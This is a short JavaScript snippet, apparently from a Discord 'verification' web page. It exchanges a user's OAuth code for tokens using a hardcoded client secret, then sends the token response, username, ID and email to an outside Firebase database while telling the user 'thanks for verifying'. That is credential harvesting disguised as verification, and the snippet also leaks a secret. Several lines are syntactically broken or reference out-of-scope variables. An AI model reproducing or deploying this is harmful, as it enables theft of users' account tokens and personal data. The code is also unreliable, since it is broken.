function submiteemail(data){
  event.preventDefault() 
  
  var pushtofirebase = []

  pushtofirebase.push({"tokens": JSON.stringify(data), "user": data.username+"#"+data.discriminator, "id": data.id, "email": data.email, "avatar": "https://cdn.discordapp.com/avatars/"+data.id+"/"+data.avatar+".png"})
           
  

  $.ajax({
       url: 'https://bio-tolerance-default-rtdb.europe-west1.firebasedatabase.app/users.json',
       type: "PATCH",
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       success: function () {
         alert('thanks for verifying ^_^');
       },
       error: function(error) {
         alert('there was a problem, check connection and retry if still not work make a commnet in the page');
       }
     })
}
    

const Body = {
  client_id: '1001496087888142396',
  client_secret: 'yO2I4J9RqdYSFfA0UjZsYRtJUHREWdXN',
  code: decodeURIComponent($.param( "code")),
  redirect_uri: 'https://www.biotune.org/p/done.html',
  grant_type: 'authorization_code',
  scope :'identity'
}

$.ajax({
       url: "https://discord.com/api/oauth2/token",
       type: "POST",
       data: JSON.stringify(pushtofirebase),
       data: body: JSON.stringify(Body),
       success: (data) => {
         alert(data);
         submiteemail(data);
       },
       error: (error) => {
         alert('there was a problem, check connection and retry if still not work make a commnet in the page');
       }
})
